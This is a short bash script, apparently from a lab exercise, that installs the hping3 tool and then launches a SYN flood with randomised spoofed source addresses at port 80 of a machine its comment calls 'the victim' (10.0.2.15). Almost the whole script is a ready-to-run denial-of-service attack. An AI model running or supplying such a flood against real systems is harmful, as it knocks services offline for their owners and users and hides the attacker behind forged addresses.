#!/bin/bash

# 1. Install hping3
if ! command -v hping3 &> /dev/null
then
    echo "hping3 is not installed. Installing..."
    sudo apt-get -y install hping3
else
    echo "hping3 is already installed."
fi

# 2. Start directing the SYN flood attack to the victim's IP address (10.0.2.15)
hping3 --count 15000 --data 120 --syn --win 64 -p 80 --flood --rand-source 10.0.2.15